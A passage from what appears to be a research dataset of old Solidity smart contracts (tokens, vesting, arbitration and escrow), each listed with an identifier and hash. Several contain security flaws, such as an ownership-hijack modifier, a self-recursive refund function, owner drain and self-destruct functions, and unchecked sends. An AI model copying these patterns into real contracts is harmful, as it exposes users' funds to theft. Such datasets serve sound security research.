                to.transfer(amount);
                Withdrawal(to, amount);
            }
        }
    }
    function lock() public { if(Locked) revert(); Locked = true; }
    modifier open { if (!Locked) _; owner = msg.sender; deposit(); }
    function kill() public { require(this.balance == 0); selfdestruct(Owner); }
    function getOwner() external constant returns (address) { return owner; }
}
```

## RQ1_da70e0077699

SHA-256 `6402874dc0e16270495357eb75f286e813f1cfa060f7f727414bd54e20da92cd`

```solidity
pragma solidity ^0.4.13;
contract DaoToken {
  uint256 public CAP;
  uint256 public totalEthers;
  function proxyPayment(address participant) payable;
  function transfer(address _to, uint _amount) returns (bool success);
}
contract ZiberToken {
  mapping (address => uint256) public balances;
  mapping (address => bool) public checked_in;
  uint256 public bounty;
  bool public bought_tokens;
  uint256 public time_bought;
  bool public kill_switch;
  string public name;
  string public symbol;
  uint8 public decimals;
  uint256 ZBR_per_eth = 17440;
  uint256 ZBR_total_reserve = 100000000;
  uint256 ZBR_dev_reserved = 10000000;
  uint256 ZBR_for_selling = 80000000;
  uint256 ZBR_for_bounty= 10000000;
  uint256 ETH_to_end = 50000 ether;
  uint registredTo;
  uint256 loadedRefund;
  uint256 _supply;
  string _name;
  string _symbol;
  uint8 _decimals;
  DaoToken public token = DaoToken(0xa9d585CE3B227d69985c3F7A866fE7d0e510da50);
  address developer_address = 0x650887B33BFA423240ED7Bc4BD26c66075E3bEaf;
    mapping (address => uint256) public balanceOf;
    event Transfer(address indexed from, address indexed to, uint256 value);
    function ZiberToken() {
        _supply = 10000000000;
        balanceOf[msg.sender] = _supply;
        name = "ZIBER CW Tokens";     
        symbol = "ZBR";
        decimals = 2;
    }
    function safeMul(uint a, uint b) internal returns (uint) {
      uint c = a * b;
      assert(a == 0 || c / a == b);
      return c;
    }
    function safeDiv(uint a, uint b) internal returns (uint) {
      assert(b > 0);
      uint c = a / b;
      assert(a == b * c + a % b);
      return c;
    }
    function safeSub(uint a, uint b) internal returns (uint) {
      assert(b <= a);
      return a - b;
    }
    function safeAdd(uint a, uint b) internal returns (uint) {
      uint c = a + b;
      assert(c>=a && c>=b);
      return c;
    }
    function max64(uint64 a, uint64 b) internal constant returns (uint64) {
      return a >= b ? a : b;
    }
    function min64(uint64 a, uint64 b) internal constant returns (uint64) {
      return a < b ? a : b;
    }
    function max256(uint256 a, uint256 b) internal constant returns (uint256) {
      return a >= b ? a : b;
    }
    function min256(uint256 a, uint256 b) internal constant returns (uint256) {
      return a < b ? a : b;
    }
    function assert(bool assertion) internal {
      if (!assertion) {
        throw;
      }
    }
    function loadRefund() payable {
      if(msg.value == 0) throw;
      loadedRefund = safeAdd(loadedRefund, msg.value);
    }
    function refund() private  {
      uint256 weiValue = this.balance;
      if (weiValue == 0) throw;
      uint256 weiRefunded;
      weiRefunded = safeAdd(weiRefunded, weiValue);
      refund();
      if (!msg.sender.send(weiValue)) throw;
    }
    function transfer(address _to, uint256 _value) {
        if (balanceOf[msg.sender] < _value) throw;
        if (balanceOf[_to] + _value < balanceOf[_to]) throw;
        balanceOf[msg.sender] -= _value;
        balanceOf[_to] += _value;
        Transfer(msg.sender, _to, _value);
    }
  function activate_kill_switch() {
    if (msg.sender != developer_address) throw;
    kill_switch = true;
  }
  function withdraw(){
    if (!bought_tokens) {
      uint256 eth_amount = balances[msg.sender];
      balances[msg.sender] = 0;
      msg.sender.transfer(eth_amount);
    }
    else {
      uint256 ZBR_amount = balances[msg.sender] * ZBR_per_eth;
      balances[msg.sender] = 0;
      uint256 fee = 0;
      if (!checked_in[msg.sender]) {
        fee = ZBR_amount / 100;
        if(!token.transfer(developer_address, fee)) throw;
      }
      if(!token.transfer(msg.sender, ZBR_amount - fee)) throw;
    }
  }
  function add_to_bounty() payable {
    if (msg.sender != developer_address) throw;
    if (kill_switch) throw;
    if (bought_tokens) throw;
    bounty += msg.value;
  }
  function claim_bounty(){
    if (bought_tokens) return;
    if (kill_switch) throw;
    bought_tokens = true;
    time_bought = now + 1 days;
    token.proxyPayment.value(this.balance - bounty)(address(this));
    if(this.balance > ETH_to_end)
    {
        msg.sender.transfer(bounty);
    }
    else {
        time_bought = now +  1 days * 9;
        if(this.balance > ETH_to_end) {
          msg.sender.transfer(bounty);
        }
      }
  }
  modifier onlyOwner() {
    if (msg.sender != developer_address) {
      throw;
    }
    _;
  }
  function withdrawEth() onlyOwner {        
        msg.sender.transfer(this.balance);
  }
  function kill() onlyOwner {        
        selfdestruct(developer_address);
  }
  function default_helper() payable {
    if (now < 1500400350 ) throw; 
    else {
      if (msg.value <= 1 finney) {
        if (bought_tokens) {
          if (token.totalEthers() >= token.CAP()) throw;
          checked_in[msg.sender] = true;
        }
        else {
          withdraw();
        }
      }
      else {
        if (kill_switch) throw;
        if (bought_tokens) throw;
        balances[msg.sender] += msg.value;
      }
    }
  }
  function () payable {
    default_helper();
  }
}
```

## RQ1_9d65bd6a5d25

SHA-256 `142aeb1929e04d4e0016c62ae9e49c7aa328c2a34b6f681f9d13876951dcd426`

```solidity
pragma solidity >=0.4.24;
contract Migrations {
    address public owner;
    event TransferOwnership(address oldaddr, address newaddr);
    modifier onlyOwner() { require(msg.sender == owner); _; }
    function Migrations() public {
        owner = msg.sender;
    }
    function transferOwnership(address _new) onlyOwner public {
        address oldaddr = owner;
        owner = _new;
        emit TransferOwnership(oldaddr, owner);
    }
}
library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a / b;
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}
interface tokenRecipient { function receiveApproval(address _from, uint256 _value, address _token, bytes _extraData) public; }
contract BezantERC20Base {
    using SafeMath for uint256;
                       string public name;
    string public symbol;
    uint8 public decimals = 18;
    uint256 public totalSupply;
    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Burn(address indexed from, uint256 value);
    function BezantERC20Base(string tokenName) public {
        uint256 initialSupply = 1000000000;
        totalSupply = initialSupply.mul(1 ether);  
        balanceOf[msg.sender] = totalSupply;                    
        name = tokenName;                                       
        symbol = 'BZNT';                                   
    }
    function _transfer(address _from, address _to, uint256 _value) internal {
        require(_to != 0x0);
        require(balanceOf[_from] >= _value);
        require(balanceOf[_to].add(_value) > balanceOf[_to]);
        uint256 previousBalances = balanceOf[_from].add(balanceOf[_to]);
        balanceOf[_from] = balanceOf[_from].sub(_value);
        balanceOf[_to] = balanceOf[_to].add(_value);
        emit Transfer(_from, _to, _value);
        assert(balanceOf[_from].add(balanceOf[_to]) == previousBalances);
    }
    function transfer(address _to, uint256 _value) public {
        _transfer(msg.sender, _to, _value);
    }
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(_value <= allowance[_from][msg.sender]);     
        allowance[_from][msg.sender] = allowance[_from][msg.sender].sub(_value);
        _transfer(_from, _to, _value);
        return true;
    }
    function approve(address _spender, uint256 _value) public returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        return true;
    }
    function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {
        tokenRecipient spender = tokenRecipient(_spender);
        if (approve(_spender, _value)) {
            spender.receiveApproval(msg.sender, _value, this, _extraData);
            return true;
        }
    }
    function burn(uint256 _value) public returns (bool success) {
        require(balanceOf[msg.sender] >= _value);   
        balanceOf[msg.sender] = balanceOf[msg.sender].sub(_value);            
        totalSupply = totalSupply.sub(_value);                      
        emit Burn(msg.sender, _value);
        return true;
    }
    function burnFrom(address _from, uint256 _value) public returns (bool success) {
        require(balanceOf[_from] >= _value);                
        require(_value <= allowance[_from][msg.sender]);    
        balanceOf[_from] = balanceOf[_from].sub(_value);                         
        allowance[_from][msg.sender] = allowance[_from][msg.sender].sub(_value);             
        totalSupply = totalSupply.sub(_value);                              
        emit Burn(_from, _value);
        return true;
    }
}
contract BezantToken is Migrations, BezantERC20Base {
    bool public isUseContractFreeze;
    address public managementContractAddress;
    mapping (address => bool) public frozenAccount;
    event FrozenFunds(address target, bool frozen);
    function BezantToken(string tokenName) BezantERC20Base(tokenName) onlyOwner public {}
    function _transfer(address _from, address _to, uint256 _value) internal {
        require(_to != 0x0);
        require(balanceOf[_from] >= _value);
        require(balanceOf[_to].add(_value) > balanceOf[_to]);
        require(!frozenAccount[_from]);
        require(!frozenAccount[_to]);
        balanceOf[_from] = balanceOf[_from].sub(_value);
        balanceOf[_to] = balanceOf[_to].add(_value);
        emit Transfer(_from, _to, _value);
    }
    function freezeAccountForOwner(address target, bool freeze) onlyOwner public {
        frozenAccount[target] = freeze;
        emit FrozenFunds(target, freeze);
    }
    function setManagementContractAddress(bool _isUse, address _from) onlyOwner public {
        isUseContractFreeze = _isUse;
        managementContractAddress = _from;
    }
    function freezeAccountForContract(address target, bool freeze) public {
        require(isUseContractFreeze);
        require(managementContractAddress == msg.sender);
        frozenAccount[target] = freeze;
        emit FrozenFunds(target, freeze);
    }
}

```

## RQ1_b11b4b1e0dc3

SHA-256 `7ea0716f3e4d3f05ec4f8a2b008f323a30ec5dc6c635d8f9884da7ca7a5df16b`

```solidity
pragma solidity ^0.4.20;
contract Nine {
  address public God;
  function Nine() public {
    God = msg.sender;
  }
  modifier onlyGod() {
    require(msg.sender == God);
    _;
  }
  function destroyTheUniverse () private {
    selfdestruct(God);
  }
  address public agentAddress;
  uint256 public nameValue = 10 finney;
  function setAgent(address _newAgent) external onlyGod {
    require(_newAgent != address(0));
    agentAddress = _newAgent;
  }
  modifier onlyAgent() {
    require(msg.sender == agentAddress);
    _;
  }
  function withdrawBalance(uint256 amount) external onlyAgent {
    msg.sender.transfer(amount <= 0 ? address(this).balance : amount);
  }
  function setNameValue(uint256 val) external onlyAgent {
    nameValue = val;
  }
  string public constant name = "TheNineBillionNamesOfGod";
  string public constant symbol = "NOG";
  uint256 public constant totalSupply = 9000000000;
  struct Name {
    uint64 recordTime;
  }
  Name[] names;
  mapping (uint256 => address) public nameIndexToOwner;
  mapping (address => uint256) ownershipTokenCount;
  event Transfer(address from, address to, uint256 tokenId);
  event Record(address owner, uint256 nameId);
  function _transfer(address _from, address _to, uint256 _tokenId) internal {
    ownershipTokenCount[_to]++;
    nameIndexToOwner[_tokenId] = _to;
    if (_from != address(0)) {
      ownershipTokenCount[_from]--;
    }
    Transfer(_from, _to, _tokenId);
  }
  function _recordName(address _owner)
    internal
    returns (uint)
  {
    Name memory _name = Name({recordTime: uint64(now)});
    uint256 newNameId = names.push(_name) - 1;
    require(newNameId == uint256(uint32(newNameId)));
    Record(_owner,newNameId);
    _transfer(0, _owner, newNameId);
    if (names.length == totalSupply) {
      destroyTheUniverse();
    }
    return newNameId;
  }
  function _owns(address _claimant, uint256 _tokenId) internal view returns (bool) {
    return nameIndexToOwner[_tokenId] == _claimant;
  }
  function balanceOf(address _owner) public view returns (uint256 count) {
    return ownershipTokenCount[_owner];
  }
  function transfer(
                    address _to,
                    uint256 _tokenId
                    )
    external
  {
    require(_to != address(0));
    require(_to != address(this));
    require(_owns(msg.sender, _tokenId));
    _transfer(msg.sender, _to, _tokenId);
  }
  function recordNameCount() public view returns (uint) {
    return names.length;
  }
  function ownerOf(uint256 _tokenId)
    external
    view
    returns (address owner)
  {
    owner = nameIndexToOwner[_tokenId];
    require(owner != address(0));
  }
  function tokensOfOwner(address _owner) external view returns(uint256[] ownerTokens) {
    uint256 tokenCount = balanceOf(_owner);
    if (tokenCount == 0) {
      return new uint256[](0);
    } else {
      uint256[] memory result = new uint256[](tokenCount);
      uint256 totalRecord = recordNameCount();
      uint256 resultIndex = 0;
      uint256 nId;
      for (nId = 1; nId < totalRecord; nId++) {
        if (nameIndexToOwner[nId] == _owner) {
          result[resultIndex] = nId;
          resultIndex++;
        }
      }
      return result;
    }
  }
  function getName(uint256 _id)
    external
    view
    returns (uint256 recordTime) {
    recordTime = uint256(names[_id].recordTime);
  }
  function tryToRecord(address _sender, uint256 _value) internal {
    uint times = _value / nameValue;
    for (uint i = 0; i < times; i++) {
      _recordName(_sender);
    }
  }
  function recordName() external payable {
    tryToRecord(msg.sender, msg.value);
  }
  function() external payable {
    tryToRecord(msg.sender, msg.value);
  }
}
```

## RQ1_a4f5912d615b

SHA-256 `af4395855e81913e0177c9d15e7d9c8b4aa1ce8bbcb2dffe016fd94ad20a8190`

```solidity
pragma solidity ^0.4.24;
contract DBC {
    modifier pre_cond(bool condition) {
        require(condition);
        _;
    }
    modifier post_cond(bool condition) {
        _;
        assert(condition);
    }
    modifier invariant(bool condition) {
        require(condition);
        _;
        assert(condition);
    }
}
contract ERC20Interface {
    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
    function totalSupply() constant returns (uint256 totalSupply) {}
    function balanceOf(address _owner) constant returns (uint256 balance) {}
    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}
    function transfer(address _to, uint256 _value) returns (bool success) {}
    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}
    function approve(address _spender, uint256 _value) returns (bool success) {}
}
contract ERC20 is ERC20Interface {
    function transfer(address _to, uint256 _value) returns (bool success) {
        if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {
            balances[msg.sender] -= _value;
            balances[_to] += _value;
            Transfer(msg.sender, _to, _value);
            return true;
        } else { throw; }
    }
    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {
        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {
            balances[_to] += _value;
            balances[_from] -= _value;
            allowed[_from][msg.sender] -= _value;
            Transfer(_from, _to, _value);
            return true;
        } else { throw; }
    }
    function balanceOf(address _owner) constant returns (uint256 balance) {
        return balances[_owner];
    }
    function approve(address _spender, uint256 _value) returns (bool success) {
        if (_value > 0) {
            require(allowed[msg.sender][_spender] == 0);
        }
        allowed[msg.sender][_spender] = _value;
        Approval(msg.sender, _spender, _value);
        return true;
    }
    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {
        return allowed[_owner][_spender];
    }
    mapping (address => uint256) balances;
    mapping (address => mapping (address => uint256)) allowed;
    uint256 public totalSupply;
}
contract Owned {
    address public owner;
    function isOwner() internal returns (bool) { return msg.sender == owner; }
    function Owned() { owner = msg.sender; }
}
contract Vesting is DBC, Owned {
    using safeMath for uint;
    ERC20 public MELON_CONTRACT; 
    uint public totalVestedAmount; 
    uint public vestingStartTime; 
    uint public vestingPeriod; 
    address public beneficiary; 
    bool public revoked; 
    uint public withdrawnByBeneficiary; 
    function isBeneficiary() constant returns (bool) { return msg.sender == beneficiary; }
    function isVestingStarted() constant returns (bool) { return totalVestedAmount != 0; }
    function isVestingRevoked() constant returns (bool) { return revoked; }
    function withdrawnMelon() constant returns (uint) {
        return revoked ? withdrawnByBeneficiary : totalVestedAmount.sub(MELON_CONTRACT.balanceOf(this));
    }
    function calculateWithdrawable() constant returns (uint withdrawable) {
        uint timePassed = now.sub(vestingStartTime);
        if (timePassed < vestingPeriod) {
            uint vested = totalVestedAmount.mul(timePassed).div(vestingPeriod);
            withdrawable = vested.sub(withdrawnMelon());
        } else {
            withdrawable = totalVestedAmount.sub(withdrawnMelon());
        }
    }
    function Vesting(address ofMelonAsset) {
        MELON_CONTRACT = ERC20(ofMelonAsset);
    }
    function setVesting(address ofBeneficiary, uint ofMelonQuantity, uint ofVestingPeriod)
        pre_cond(!isVestingStarted())
    {
        assert(MELON_CONTRACT.transferFrom(msg.sender, this, ofMelonQuantity));
        vestingStartTime = now;
        totalVestedAmount = ofMelonQuantity;
        vestingPeriod = ofVestingPeriod;
        beneficiary = ofBeneficiary;
    }
    function withdraw()
        pre_cond(isBeneficiary())
        pre_cond(isVestingStarted())
    {
        uint withdrawable = revoked ? MELON_CONTRACT.balanceOf(this) : calculateWithdrawable();
        assert(MELON_CONTRACT.transfer(beneficiary, withdrawable));
    }
    function revokeAndReclaim()
        pre_cond(isOwner())
        pre_cond(!isVestingRevoked())
    {
        uint reclaimable = totalVestedAmount.sub(calculateWithdrawable());
        withdrawnByBeneficiary = withdrawnMelon();
        revoked = true;
        assert(MELON_CONTRACT.transfer(owner, reclaimable));
    }
}
library safeMath {
  function mul(uint a, uint b) internal returns (uint) {
    uint c = a * b;
    assert(a == 0 || c / a == b);
    return c;
  }
  function div(uint a, uint b) internal returns (uint) {
    uint c = a / b;
    return c;
  }
  function sub(uint a, uint b) internal returns (uint) {
    assert(b <= a);
    return a - b;
  }
  function add(uint a, uint b) internal returns (uint) {
    uint c = a + b;
    assert(c >= a);
    return c;
  }
  function max64(uint64 a, uint64 b) internal constant returns (uint64) {
    return a >= b ? a : b;
  }
  function min64(uint64 a, uint64 b) internal constant returns (uint64) {
    return a < b ? a : b;
  }
  function max256(uint256 a, uint256 b) internal constant returns (uint256) {
    return a >= b ? a : b;
  }
  function min256(uint256 a, uint256 b) internal constant returns (uint256) {
    return a < b ? a : b;
  }
}

```

## RQ1_6cc3d30752da

SHA-256 `10c4bf973177e2a201f701acbe918906692dacaae37e5db94627b85f1fe8d0c3`

```solidity
pragma solidity ^0.4.24;
interface IArbitrable {
    event MetaEvidence(uint indexed _metaEvidenceID, string _evidence);
    event Dispute(Arbitrator indexed _arbitrator, uint indexed _disputeID, uint _metaEvidenceID, uint _evidenceGroupID);
    event Evidence(Arbitrator indexed _arbitrator, uint indexed _evidenceGroupID, address indexed _party, string _evidence);
    event Ruling(Arbitrator indexed _arbitrator, uint indexed _disputeID, uint _ruling);
    function rule(uint _disputeID, uint _ruling) external;
}
contract Arbitrable is IArbitrable {
    Arbitrator public arbitrator;
    bytes public arbitratorExtraData;
    modifier onlyArbitrator {require(msg.sender == address(arbitrator), "Can only be called by the arbitrator."); _;}
    constructor(Arbitrator _arbitrator, bytes memory _arbitratorExtraData) public {
        arbitrator = _arbitrator;
        arbitratorExtraData = _arbitratorExtraData;
    }
    function rule(uint _disputeID, uint _ruling) public onlyArbitrator {
        emit Ruling(Arbitrator(msg.sender),_disputeID,_ruling);
        executeRuling(_disputeID,_ruling);
    }
    function executeRuling(uint _disputeID, uint _ruling) internal;
}
contract Arbitrator {
    enum DisputeStatus {Waiting, Appealable, Solved}
    modifier requireArbitrationFee(bytes memory _extraData) {
        require(msg.value >= arbitrationCost(_extraData), "Not enough ETH to cover arbitration costs.");
        _;
    }
    modifier requireAppealFee(uint _disputeID, bytes memory _extraData) {
        require(msg.value >= appealCost(_disputeID, _extraData), "Not enough ETH to cover appeal costs.");
        _;
    }
    event DisputeCreation(uint indexed _disputeID, Arbitrable indexed _arbitrable);
    event AppealPossible(uint indexed _disputeID, Arbitrable indexed _arbitrable);
    event AppealDecision(uint indexed _disputeID, Arbitrable indexed _arbitrable);
    function createDispute(uint _choices, bytes memory _extraData) public requireArbitrationFee(_extraData) payable returns(uint disputeID) {}
    function arbitrationCost(bytes memory _extraData) public view returns(uint fee);
    function appeal(uint _disputeID, bytes memory _extraData) public requireAppealFee(_disputeID,_extraData) payable {
        emit AppealDecision(_disputeID, Arbitrable(msg.sender));
    }
    function appealCost(uint _disputeID, bytes memory _extraData) public view returns(uint fee);
    function appealPeriod(uint _disputeID) public view returns(uint start, uint end) {}
    function disputeStatus(uint _disputeID) public view returns(DisputeStatus status);
    function currentRuling(uint _disputeID) public view returns(uint ruling);
}
contract CentralizedArbitrator is Arbitrator {
    address public owner = msg.sender;
    uint arbitrationPrice; 
    uint constant NOT_PAYABLE_VALUE = (2**256-2)/2; 
    struct DisputeStruct {
        Arbitrable arbitrated;
        uint choices;
        uint fee;
        uint ruling;
        DisputeStatus status;
    }
    modifier onlyOwner {require(msg.sender==owner, "Can only be called by the owner."); _;}
    DisputeStruct[] public disputes;
    constructor(uint _arbitrationPrice) public {
        arbitrationPrice = _arbitrationPrice;
    }
    function setArbitrationPrice(uint _arbitrationPrice) public onlyOwner {
        arbitrationPrice = _arbitrationPrice;
    }
    function arbitrationCost(bytes _extraData) public view returns(uint fee) {
        return arbitrationPrice;
    }
    function appealCost(uint _disputeID, bytes _extraData) public view returns(uint fee) {
        return NOT_PAYABLE_VALUE;
    }
    function createDispute(uint _choices, bytes _extraData) public payable returns(uint disputeID)  {
        super.createDispute(_choices, _extraData);
        disputeID = disputes.push(DisputeStruct({
            arbitrated: Arbitrable(msg.sender),
            choices: _choices,
            fee: msg.value,
            ruling: 0,
            status: DisputeStatus.Waiting
            })) - 1; 
        emit DisputeCreation(disputeID, Arbitrable(msg.sender));
    }
    function _giveRuling(uint _disputeID, uint _ruling) internal {
        DisputeStruct storage dispute = disputes[_disputeID];
        require(_ruling <= dispute.choices, "Invalid ruling.");
        require(dispute.status != DisputeStatus.Solved, "The dispute must not be solved already.");
        dispute.ruling = _ruling;
        dispute.status = DisputeStatus.Solved;
        msg.sender.send(dispute.fee); 
        dispute.arbitrated.rule(_disputeID,_ruling);
    }
    function giveRuling(uint _disputeID, uint _ruling) public onlyOwner {
        return _giveRuling(_disputeID, _ruling);
    }
    function disputeStatus(uint _disputeID) public view returns(DisputeStatus status) {
        return disputes[_disputeID].status;
    }
    function currentRuling(uint _disputeID) public view returns(uint ruling) {
        return disputes[_disputeID].ruling;
    }
}
contract AppealableArbitrator is CentralizedArbitrator, Arbitrable {
    struct AppealDispute {
        uint rulingTime;
        Arbitrator arbitrator;
        uint appealDisputeID;
    }
    uint public timeOut;
    mapping(uint => AppealDispute) public appealDisputes;
    mapping(uint => uint) public appealDisputeIDsToDisputeIDs;
    constructor(
        uint _arbitrationPrice,
        Arbitrator _arbitrator,
        bytes _arbitratorExtraData,
        uint _timeOut
    ) public CentralizedArbitrator(_arbitrationPrice) Arbitrable(_arbitrator, _arbitratorExtraData) {
        timeOut = _timeOut;
    }
    function changeArbitrator(Arbitrator _arbitrator) external onlyOwner {
        arbitrator = _arbitrator;
    }
    function changeTimeOut(uint _timeOut) external onlyOwner {
        timeOut = _timeOut;
    }
    function getAppealDisputeID(uint _disputeID) external view returns(uint disputeID) {
        if (appealDisputes[_disputeID].arbitrator != Arbitrator(address(0)))
            disputeID = AppealableArbitrator(appealDisputes[_disputeID].arbitrator).getAppealDisputeID(appealDisputes[_disputeID].appealDisputeID);
        else disputeID = _disputeID;
    }
    function appeal(uint _disputeID, bytes _extraData) public payable requireAppealFee(_disputeID, _extraData) {
        super.appeal(_disputeID, _extraData);
        if (appealDisputes[_disputeID].arbitrator != Arbitrator(address(0)))
            appealDisputes[_disputeID].arbitrator.appeal.value(msg.value)(appealDisputes[_disputeID].appealDisputeID, _extraData);
        else {
            appealDisputes[_disputeID].arbitrator = arbitrator;
            appealDisputes[_disputeID].appealDisputeID = arbitrator.createDispute.value(msg.value)(disputes[_disputeID].choices, _extraData);
            appealDisputeIDsToDisputeIDs[appealDisputes[_disputeID].appealDisputeID] = _disputeID;
        }
    }
    function giveRuling(uint _disputeID, uint _ruling) public {
        require(disputes[_disputeID].status != DisputeStatus.Solved, "The specified dispute is already resolved.");
        if (appealDisputes[_disputeID].arbitrator != Arbitrator(address(0))) {
            require(Arbitrator(msg.sender) == appealDisputes[_disputeID].arbitrator, "Appealed disputes must be ruled by their back up arbitrator.");
            super._giveRuling(_disputeID, _ruling);
        } else {
            require(msg.sender == owner, "Not appealed disputes must be ruled by the owner.");
            if (disputes[_disputeID].status == DisputeStatus.Appealable) {
                if (now - appealDisputes[_disputeID].rulingTime > timeOut)
                    super._giveRuling(_disputeID, disputes[_disputeID].ruling);
                else revert("Time out time has not passed yet.");
            } else {
                disputes[_disputeID].ruling = _ruling;
                disputes[_disputeID].status = DisputeStatus.Appealable;
                appealDisputes[_disputeID].rulingTime = now;
                emit AppealPossible(_disputeID, disputes[_disputeID].arbitrated);
            }
        }
    }
    function appealCost(uint _disputeID, bytes _extraData) public view returns(uint cost) {
        if (appealDisputes[_disputeID].arbitrator != Arbitrator(address(0)))
            cost = appealDisputes[_disputeID].arbitrator.appealCost(appealDisputes[_disputeID].appealDisputeID, _extraData);
        else if (disputes[_disputeID].status == DisputeStatus.Appealable) cost = arbitrator.arbitrationCost(_extraData);
        else cost = NOT_PAYABLE_VALUE;
    }
    function disputeStatus(uint _disputeID) public view returns(DisputeStatus status) {
        if (appealDisputes[_disputeID].arbitrator != Arbitrator(address(0)))
            status = appealDisputes[_disputeID].arbitrator.disputeStatus(appealDisputes[_disputeID].appealDisputeID);
        else status = disputes[_disputeID].status;
    }
    function executeRuling(uint _disputeID, uint _ruling) internal {
        require(
            appealDisputes[appealDisputeIDsToDisputeIDs[_disputeID]].arbitrator != Arbitrator(address(0)),
            "The dispute must have been appealed."
        );
        giveRuling(appealDisputeIDsToDisputeIDs[_disputeID], _ruling);
    }
}
contract MultipleArbitrableTransaction is IArbitrable {
    uint8 constant AMOUNT_OF_CHOICES = 2;
    uint8 constant SENDER_WINS = 1;
    uint8 constant RECEIVER_WINS = 2;
    enum Party {Sender, Receiver}
    enum Status {NoDispute, WaitingSender, WaitingReceiver, DisputeCreated, Resolved}
    struct Transaction {
        address sender;
        address receiver;
        uint amount;
        uint timeoutPayment; 
        uint disputeId; 
        uint senderFee; 
        uint receiverFee; 
        uint lastInteraction; 
        Status status;
    }
    Transaction[] public transactions;
    bytes public arbitratorExtraData; 
    Arbitrator public arbitrator; 
    uint public feeTimeout; 
    mapping (uint => uint) public disputeIDtoTransactionID; 
    event MetaEvidence(uint indexed _metaEvidenceID, string _evidence);
    event Payment(uint indexed _transactionID, uint _amount, address _party);
    event HasToPayFee(uint indexed _transactionID, Party _party);
    event Evidence(Arbitrator indexed _arbitrator, uint indexed _evidenceGroupID, address indexed _party, string _evidence);
    event Dispute(Arbitrator indexed _arbitrator, uint indexed _disputeID, uint _metaEvidenceID, uint _evidenceGroupID);
    event Ruling(Arbitrator indexed _arbitrator, uint indexed _disputeID, uint _ruling);
    constructor (
        Arbitrator _arbitrator,
        bytes _arbitratorExtraData,
        uint _feeTimeout
    ) public {
        arbitrator = _arbitrator;
        arbitratorExtraData = _arbitratorExtraData;
        feeTimeout = _feeTimeout;
    }
    function createTransaction(
        uint _timeoutPayment,
        address _receiver,
        string _metaEvidence
    ) public payable returns (uint transactionID) {
        transactions.push(Transaction({
            sender: msg.sender,
            receiver: _receiver,
            amount: msg.value,
            timeoutPayment: _timeoutPayment,
            disputeId: 0,
            senderFee: 0,
            receiverFee: 0,
            lastInteraction: now,
            status: Status.NoDispute
        }));
        emit MetaEvidence(transactions.length - 1, _metaEvidence);
        return transactions.length - 1;
    }
    function pay(uint _transactionID, uint _amount) public {
        Transaction storage transaction = transactions[_transactionID];
        require(transaction.sender == msg.sender, "The caller must be the sender.");
        require(transaction.status == Status.NoDispute, "The transaction shouldn't be disputed.");
        require(_amount <= transaction.amount, "The amount paid has to be less than or equal to the transaction.");
        transaction.receiver.transfer(_amount);
        transaction.amount -= _amount;
        emit Payment(_transactionID, _amount, msg.sender);
    }
    function reimburse(uint _transactionID, uint _amountReimbursed) public {
        Transaction storage transaction = transactions[_transactionID];
        require(transaction.receiver == msg.sender, "The caller must be the receiver.");
        require(transaction.status == Status.NoDispute, "The transaction shouldn't be disputed.");
        require(_amountReimbursed <= transaction.amount, "The amount reimbursed has to be less or equal than the transaction.");
        transaction.sender.transfer(_amountReimbursed);
        transaction.amount -= _amountReimbursed;
        emit Payment(_transactionID, _amountReimbursed, msg.sender);
    }
    function executeTransaction(uint _transactionID) public {
        Transaction storage transaction = transactions[_transactionID];
        require(now - transaction.lastInteraction >= transaction.timeoutPayment, "The timeout has not passed yet.");
        require(transaction.status == Status.NoDispute, "The transaction shouldn't be disputed.");
        transaction.receiver.transfer(transaction.amount);
        transaction.amount = 0;
        transaction.status = Status.Resolved;
    }
    function timeOutBySender(uint _transactionID) public {
        Transaction storage transaction = transactions[_transactionID];
        require(transaction.status == Status.WaitingReceiver, "The transaction is not waiting on the receiver.");
        require(now - transaction.lastInteraction >= feeTimeout, "Timeout time has not passed yet.");
        executeRuling(_transactionID, SENDER_WINS);
    }
    function timeOutByReceiver(uint _transactionID) public {
        Transaction storage transaction = transactions[_transactionID];
        require(transaction.status == Status.WaitingSender, "The transaction is not waiting on the sender.");
        require(now - transaction.lastInteraction >= feeTimeout, "Timeout time has not passed yet.");
        executeRuling(_transactionID, RECEIVER_WINS);
    }
    function payArbitrationFeeBySender(uint _transactionID) public payable {
        Transaction storage transaction = transactions[_transactionID];
        uint arbitrationCost = arbitrator.arbitrationCost(arbitratorExtraData);
        require(transaction.status < Status.DisputeCreated, "Dispute has already been created or because the transaction has been executed.");
        require(msg.sender == transaction.sender, "The caller must be the sender.");
        transaction.senderFee += msg.value;
        require(transaction.senderFee >= arbitrationCost, "The sender fee must cover arbitration costs.");
        transaction.lastInteraction = now;
        if (transaction.receiverFee < arbitrationCost) {
            transaction.status = Status.WaitingReceiver;
            emit HasToPayFee(_transactionID, Party.Receiver);
        } else { 
            raiseDispute(_transactionID, arbitrationCost);
        }
    }
    function payArbitrationFeeByReceiver(uint _transactionID) public payable {
        Transaction storage transaction = transactions[_transactionID];
        uint arbitrationCost = arbitrator.arbitrationCost(arbitratorExtraData);
        require(transaction.status < Status.DisputeCreated, "Dispute has already been created or because the transaction has been executed.");
        require(msg.sender == transaction.receiver, "The caller must be the receiver.");
        transaction.receiverFee += msg.value;
        require(transaction.receiverFee >= arbitrationCost, "The receiver fee must cover arbitration costs.");
        transaction.lastInteraction = now;
        if (transaction.senderFee < arbitrationCost) {
            transaction.status = Status.WaitingSender;
